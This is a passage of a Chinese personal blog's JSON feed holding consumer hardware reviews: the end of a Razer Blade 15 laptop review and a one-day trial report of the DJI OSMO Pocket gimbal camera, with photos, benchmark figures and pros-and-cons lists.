的各类手势支持良好。</p>\n<p><strong>键盘总的来说还行</strong>，键程不短，触感不算太软，为平面键帽；没有小键盘，不过方向键的大小与其他键一致。有一点要吐槽的就是键盘的按键标识是上下颠倒的…也就是需要配合 <kbd>Shift</kbd> 使用的键的标识反而在直接使用的键的标识的下方…虽然影响不大，但打字时看到键盘着实觉得违和。</p>\n<p>没有了小键盘，C 面多出来的空间被留给了扬声器。<strong>而这个声音…比较一般</strong>，整体听感有些薄而含混。不过好歹是 C 面朝上的双扬声器，声音还算清楚，而且立体声的感觉较强。加上自带的 Dolby Atmos 加成，<strong>总体听感还算可以。</strong></p>\n<p>另外，开机键被藏在了右侧扬声器上方，没有灯，有些低调。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"2264\" class=\"aligncenter size-full wp-image-1392\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-300x295.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-768x756.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-1024x1008.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>系统</h1>\n<p>出厂带有 Windows 10 家庭版，预装雷蛇雷云。在雷云内不仅可以调整这台电脑的灯光、性能等设置，还可以一并调整所有连接到这台电脑的雷蛇外设的设置。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1387\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>雷云 3 主界面</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1390\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>灯光拥有丰富的自定义选项（灯厂无疑了）</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"434\" height=\"262\" class=\"aligncenter size-full wp-image-1389\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg 434w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3-300x181.jpg 300w\" sizes=\"(max-width: 434px) 100vw, 434px\"></a>\n<p><span>可以调整屏幕刷新率</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1393\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>通过 Chroma 可以在支持的软件内使键盘背光与软件内容同步</span></p>\n<p><strong>不过由于雷蛇的服务器在大陆一向不稳定，雷云在实际体验上真的是…一言难尽。</strong>有时候会莫名开机不自启、主面板无限加载、灯光配置无法应用…心累。</p>\n<p>此外，显卡驱动似乎也不太稳定（这大概是英伟达的锅？）。偶尔屏幕会突然黑掉，需要合盖再开盖才能再次唤醒屏幕；甚至有一次我遇到了 10 分钟内连续两次蓝屏…至少从错误代码来看问题出在显卡驱动。不过这些问题遇到的几率也不大，一个月内绝大部分时间它还是正常工作的，显卡驱动也没有在我游戏的时候崩掉过。还算能用吧。</p>\n<h1>性能</h1>\n<p>作为妥妥的游戏本，Razer Blade 15 配备了 i7-9750H，RTX2070 Max-Q，16 GB 内存，<strong>性能自然是不差的，基本达到了这一水平笔记本的一般水准。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"702\" height=\"400\" class=\"aligncenter size-full wp-image-1410\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg 702w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19-300x171.jpg 300w\" sizes=\"(max-width: 702px) 100vw, 702px\"></a>\n<p><span>CPU-Z 和 GPU-Z</span></p>\n<p>i7-9750H 默频 2.60GHz，睿频可达 4GHz 左右，<strong>然而只是 30 秒真男人。</strong>25度室温、高性能模式下 30 秒左右的满负载就会让这块 CPU 撞墙，频率会掉到 3GHz 出头并稳定在此，<strong>而平衡模式则更快。</strong></p>\n<p>Razer Blade 15 配备的是一块 Max-Q 版本的 RTX2070，<strong>而且是较低功耗 80W 的版本</strong>，猜测是为了散热考虑（毕竟这么薄了）。风扇全开散热时风扇声音较响，但仍能忍受；而且日常工作使用一般不会使风扇转起来，<strong>因此噪音控制还算不错。</strong></p>\n<p>由于是这篇算是简评，并没有详测游戏，直接上跑分吧。室温 25 度， 平衡模式下 Cinebench R20 分数 1927，有些偏低；而使用高性能模式时分数直接飙到 2424 分，看来平衡模式功耗墙砍得比较狠。（顺便提一句，雷蛇甚至提供了功耗更低的性能方案，没有什么测试的必要就不测了。）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"753\" height=\"637\" class=\"aligncenter size-full wp-image-1405\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg 753w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17-300x254.jpg 300w\" sizes=\"(max-width: 753px) 100vw, 753px\"></a>\n<p>在 3DMark Time Spy 测试下平衡模式 6283 分，高性能模式 6872 分，相比有一点的提升。只能说压得够狠。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"954\" class=\"aligncenter size-full wp-image-1406\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-300x149.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-768x382.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-1024x509.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>平衡模式</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"957\" class=\"aligncenter size-full wp-image-1408\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-300x150.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-768x383.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-1024x510.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>高性能模式</span></p>\n<p>至于这 16GB 的内存…至少我是完全够用，要升级的话也可以自行更换到最高 64GB。</p>\n<h1>总结</h1>\n<p>这已经不是雷蛇第一年做笔记本了。总的来看，雷蛇似乎已经有些摸清了门道。今年年中推出的配备 9 代 Intel CPU 的灵刃系列几乎可以说是在各个方面都做到了尽可能完美。当然问题也有一些，相信雷蛇可以在后续解决。总结一下我手头的这台笔记本吧。</p>\n<p>优点：</p>\n<ul>\n<li>高性能的同时有较长续航</li>\n<li>优秀的屏幕</li>\n<li>干净的外观设计</li>\n<li>薄而坚固的机身</li>\n<li>较丰富的 IO</li>\n<li>细节到位（Wi-Fi 6、Windows Hello 等等）</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>价格稍高</li>\n<li>驱动、软件等有些不稳定</li>\n<li>为了散热有一定的性能损失</li>\n<li>机身偏重</li>\n</ul>\n<p>当我正准备结束这篇简评的时候正好收到了雷蛇雷云驱动更新，其中包含了我这一型号的「问题修复与改进」。待会儿就去更新，看看雷蛇有没有解决一部分问题吧。</p>\n<p>最后加一句，本文所有图片都是由一加 7 Pro 拍摄的，也就这样吧…</p>\n","link":"https://flyhigher.top/diary/1411.html"},{"title":"OSMO Pocket 一日试用报告","date":"2019-02-02 09:38:38","description":"\n<p>计划寒假出门练练延时视频的拍摄，碰巧得知老师买了一个 <a href=\"https://www.dji.com/osmo-pocket\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OSMO Pocket</a>，正好我对这玩意儿有点兴趣，就向老师借了一天玩了玩，带着它在城市里跑了一圈，这篇文章算是试用后的总结报告。不过这毕竟只是一天快速试用之后的总结，如果有不正确或是不完善的地方还请见谅。</p>\n<p><strong>TL;DR:</strong> 这款产品目前应该只适用于重度 Vlog 拍摄者，相对其他拍摄方案有一些优势，但也有很多不足。对我来说，我本来没有太强烈的购买 OSMO Pocket 的欲望，试用过后依然没有太大的购买欲望。<strong>请谨慎考虑购买。</strong></p>\n<p>（如果出二代我可能会买吧…（小声）</p>\n<blockquote><p>这篇文章中所有图片和视频<strong>都经过二次压缩以缩短在网页上的加载时间，不代表 OSMO Pocket 的真实拍摄水平</strong>（当然所有评测都基于未压缩的原始图像），如果需要原始图像可以直接联系我。另外，本文中的多数照片/视频都是“为评测而拍”，没有刻意追求美感，虽然观感不一定好，但这不代表 OSMO Pocket 就拍不出好看的照片/视频——<strong>毕竟“人”才是一张照片是否“美”的决定因素。</strong></p></blockquote>\n<h1>初印象</h1>\n<p><strong>到手的第一印象：好小啊。</strong>虽然对 OSMO Pocket 已经提前有所了解，但刚刚接触它时仍惊讶于它的体积。就算有一层保护壳， OSMO Pocket 还是可以被轻松地放进口袋里，相对于手机+稳定器的方案，OSMO Pocket 便携多了，好评。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1867\" height=\"2500\" class=\"aligncenter size-full wp-image-1313\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg 1867w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-224x300.jpg 224w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-768x1028.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-765x1024.jpg 765w\" sizes=\"(max-width: 1867px) 100vw, 1867px\"></a>\n<p><strong>完全启动的速度挺快</strong>，不过屏幕不大。屏幕支持触摸，而机身上的实体按键只有两个。简单试用了下，在屏幕上的操作主要以滑动为主，操作逻辑还算清晰，不过这个触屏对于点击的灵敏度真的挺低的，经常出现点击却没有反应的情况 。两个实体按键之一就是拍摄键，熟悉了之后操作效率还是很高的。好评。</p>\n<p>不过由于屏幕小，实际情况下很多操作无法在屏幕上完成，<strong>因此连接手机后的 OSMO Pocket 才算得上是完整体。</strong>其与手机的连接通过物理连接（连接头）实现（不过可以通过配件实现无线连接）。</p>\n<p>我拿到 OSMO Pocket 时它已经被使用了一段时间了，手机连接头已经插在机身上了。虽然这个连接头可以卸下并反装（以保护连接头）或者换上接口保护板，但是实际操作中要卸下连接头非常麻烦，所以一般情况下为了方便使用，连接头只能以这种有点难看的姿势插在机身上。DJI 甚至考虑到了这个问题，在保护壳的绑带上切了个口子，方便连接头伸出…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"2279\" class=\"aligncenter size-full wp-image-1314\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-263x300.jpg 263w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-768x875.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-899x1024.jpg 899w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>奇葩的保护壳</p>\n<p>机身底部是一个 USB Type-C 接口，用来充电，好评。不过没有标准螺口，没法直接固定在三脚架上，需要购买额外配件，很难受。</p>\n<p>此外使用时需要从机身侧面插入一张 SD 卡用于存储拍摄内容，通过配套的 DJI Mimo APP 可以将拍摄的内容传输到手机上。DJI Mimo 同时可以在 OSMO Pocket 连接到手机后作为拍摄控制器使用。</p>\n<p>第一眼看上去，OSMO Pocket 的镜头看起来跟普通手机的镜头差不多，不过具体表现还是要在试用后才能知道。</p>\n<h1>绝赞试用中</h1>\n<p>大概熟悉了一下操作，我第二天就带着 OSMO Pocket 出门了。<strong>最大的感受是太小巧了，至少比手机+稳定器的组合甚至是 GoPro+延长杆的组合要小很多</strong>，这带来了两方面的影响，一是我可以更快地进入拍摄状态，实测我从摸口袋到 OSMO Pocket 完成启动进入拍摄状态不超过 10 秒钟；二是小巧的机身也让 OSMO Pocket 在拍摄时显得更加低调，让我这种脸皮比较薄的人减少了很多心理压力。<strong>综合起来就是让我更愿意经常取出它来拍摄了。</strong></p>\n<h2>拍摄体验</h2>\n<p>我第一个使用的功能是延时视频，结果发现没有标准螺口带来的问题比我想象的还要严重。总之最后为了能顺利地拍完延时，我不得不用一种很难受的姿势把它摁在三脚架的云台上并这样保持十几分钟…然而就算是这样后来还是翻车了（</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2428\" height=\"2500\" class=\"aligncenter size-full wp-image-1350\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg 2428w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-291x300.jpg 291w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-768x791.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-995x1024.jpg 995w\" sizes=\"(max-width: 2428px) 100vw, 2428px\"></a>\n<p>完全没法固定</p>\n<blockquote><p>买配件是不可能买配件的，这辈子都不可能买配件的，只能靠暴力摁住才勉强拍的了延时这个样子。</p></blockquote>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo3.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>摁得太用力了，三脚架云台没锁牢转偏了…</p>\n<p><strong>一个优点是拍摄延时视频时可以让云台按设定好的轨迹自动旋转。</strong>不过直接在内建屏幕上只能设定两个云台位置关键点，要连接手机才能比较方便地设定最多不超过四个关键点。延时视频的拍摄不支持防抖，任何轻微的抖动都会可能会导致成品在导出之后需要进行额外的防抖处理。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo2.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>直出延时，可以看到有轻微抖动</p>\n<p>为了方便调整云台位置我把手机插上了，然后发现这样的连接方式其实有点别扭。<strong>单手握持是不可能了：</strong>如果握着 OSMO Pocket，不仅整体重心会严重偏向手机，而且连接头大概不能长时间地支撑住悬空的手机；如果握住手机，OSMO Pocket 不算太轻的重量依然会让我担心连接头是否会损坏。算了，还是两个一起握着吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"2244\" class=\"aligncenter size-full wp-image-1315\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-300x293.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-768x749.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-1024x999.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>连接手机示意图</p>\n<p>一度考虑过要不要暂时不带 OSMO Pocket 的保护壳了，毕竟保护壳还是有点占体积的，而且每次拍摄时将本体装入取出保护壳的动作也要花一点时间。<strong>但是后来发现保护壳其实必不可少。</strong>关机后云台会自动收缩到适合装入保护壳的状态，但由于云台的姿态锁定只会持续十几秒的时间，之后云台就会解锁以至于可以随外力转动，如果不及时放回保护壳内云台就有损坏的可能。</p>\n<p>拍着拍着，突然发现…诶我的电量呢？！<strong>OSMO Pocket 的掉电非常快</strong>，大概是太小的机身里塞不下太大电池的缘故，实际使用中大概1分钟就可以掉1%的电，如果打算重度使用，一个充电宝或是官方的充电盒是必不可少的了。</p>\n<p>接着试着拍了几段视频。防抖效果不用多说了，作为 OSMO Pocket 最大卖点之一，<strong>防抖效果的确非常优秀。</strong>云台有多种跟随方式，在屏幕上点几下就能切换，很方便。可以选定一块区域让云台跟随，大部分情况下不会跟丢（除非你跑偏得云台都到限位了…）。最高支持 4K/60fps 拍摄，同时有多种帧率可选，不过想要高码率模式还得使用 1080p 拍摄。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo4.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/4.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/5.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>没有特地压缓脚步，只剩下小幅上下移动了</p>\n<p><strong>视频的收音…很迷，不能算好，甚至只能算是“勉强能听”，听起来就感觉隔着层东西。</strong>作为一个主要面向 Vlogger 的产品我不清楚这样砍音质的目的是什么，不过好在 DJI 提供了音频转接头的附件，可以外接麦克风。（又要买附件！）</p>\n<p>除了拍摄视频和延时视频，OSMO Pocket 还有拍照、全景和慢动作三个模式。拍照基本就是按一下按钮的事，不过有 M 档，可以调整快门速度等，这意味着或许可以使用 OSMO Pocket 拍摄流光照片，不过我没来得及尝试。同时可以保存 DNG 格式的照片，好评；全景只有固定的 180° 视角（可以算是1×4）和 3×3 两种模式，而且无法直接在内建屏幕上查看已拍摄的全景照片，必须使用 APP 查看（似乎全景的拼接过程也是在手机上完成的）；慢动作基本是高帧率的 1080p 视频，会在机内完成放慢的处理。<strong>值得注意的是在慢动作模式下镜头视角会变小很多（官方数据为 34.9°）。</strong></p>\n<p>配套的 APP DJI Mimo 在拍摄方面还算好用（不过首页的类抖音风格我真的受不了…）。可设置项不算多，但布局还算清晰，不难上手，跟直接在内建屏幕上操作相比，APP 用起来还是很爽的。搭配 DJI 一贯的“一键制作视频”功能，拍摄剪辑分享可以说是一气呵成。当然如果有精细制作的需求还是导出来用专业软件剪比较好。<strong>不过通过 APP 只能查看机内 SD 卡中的“成品”，比如延时视频只能导出视频而不能导出每一帧的原始图像</strong>，官方称需要使用电脑才能导出其在拍摄延时视频中拍摄的 JPEG 原始图像，不过我没来得及用电脑连上看一看。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"1080\" class=\"aligncenter size-full wp-image-1316\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-768x432.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-1024x576.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p>APP 的拍摄界面</p>\n<h2>拍摄质量</h2>\n<p>说一下“画质”。先看一下官方参数：1/2.3” CMOS，F/2，等效焦距 26mm。<strong>注意一下这个等效焦距并不广，尤其自拍的时候很容易出现“满屏幕都是脸”的情况。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"540\" height=\"362\" class=\"aligncenter size-full wp-image-1320\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg 540w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/9-300x201.jpg 300w\" sizes=\"(max-width: 540px) 100vw, 540px\"></a>\n<p>官网截图</p>\n<p>直接下结论：<strong>在我看来 OSMO Pocket 在照片/视频的拍摄质量方面与手机相比没有什么优势，甚至不如一些旗舰手机。</strong>照片比较平淡，曝光看看就好，画面放大看有比较严重的涂抹感，同时画面边缘有一些畸变。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1251\" class=\"aligncenter size-full wp-image-1336\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-1024x557.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>直出照片及其 EXIF 信息</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1360\" class=\"aligncenter size-full wp-image-1341\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-1024x557.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>当时没有拍对比照，另外用手机拍了一张大光比场景做个观感对比 (HDR+直出)</p>\n<p>夜景照片没来得及单独测试，不过从夜景延时视频的原始图像来看只能说一般般，噪点有些多，大光比场景看起来难以驾驭。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1004\" class=\"aligncenter size-full wp-image-1340 srcset=\" https: sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>夜景延时视频其中一帧的原始图像</p>\n<p>视频也类似，看得出有涂抹感，而且在大光比下容易过曝/欠曝，不过码率挺高，看起来没怎么压缩。照片看起来有所压缩，而全景则被缩放得非常厉害，基本不能放大看，不知道这是不是因为通过 APP 导出的问题，希望可以在 SD 卡中找到未压缩的原始图像。<strong>总之不管这个镜头的素质如何，最后的产出和手机相比并没有什么优势。</strong>甚至在我手机有 Google 的 HDR+ 算法加持的情况下，OSMO Pocket 的照片从观感上来说可以算是被吊打。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2490\" height=\"631\" class=\"aligncenter size-full wp-image-1335\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg 2490w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-300x76.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-768x195.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-1024x259.jpg 1024w\" sizes=\"(max-width: 2490px) 100vw, 2490px\"></a>\n<p>这张图直出尺寸只有 3984×1006</p>\n<h1>总结</h1>\n<p>OSMO Pocket 是一款优点和缺点都非常明显的产品，简单总结一下它的优缺点吧。</p>\n<p>优点：</p>\n<ul>\n<li>非常便携且启动快，可以快速进入拍摄状态</li>\n<li>优秀的防抖云台</li>\n<li>操作简单且效率高，容易上手</li>\n<li>功能还算丰富，可以满足一部分自定义的需求</li>\n<li>配合 APP 可以方便地进行拍摄分享</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>拍摄的质量与大部分手机相比没有优势</li>\n<li>贵，尤其是还有一大堆配件是需要额外购买的</li>\n<li>耗电快，续航时间比我想象的要短</li>\n<li>收音质量有待提高，镜头视角也“还不够广”</li>\n<li>部分功能感觉还有待完善</li>\n</ul>\n<p>总之，OSMO Pocket “在技术上”可以称得上是一款优秀的产品，这么小的体积却提供了优秀的防抖云台、完善的操作逻辑和不输手机的拍摄质量，很棒；<strong>但是在实用性上它的价值可能不是很高，较高的价格却无法提供相应的拍摄质量，而且对于大部分人来说，“快速进入拍摄”并不是一个痛点，这样的话，还是选择手机云台甚至相机云台吧。</strong></p>\n<p>顺便一提，由于 OSMO Pocket 在连接 Android 手机时会使用“USB 调试”功能，每当它连上我的手机时…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1080\" height=\"711\" class=\"aligncenter size-full wp-image-1318\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg 1080w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-300x198.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-768x506.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-1024x674.jpg 1024w\" sizes=\"(max-width: 1080px) 100vw, 1080px\"></a>\n<p>黑阈：？？？</p>\n<p>(╯‵□′)╯︵┻━┻</p>\n","link":"https://flyhigher.top/photograph/1309.html"}]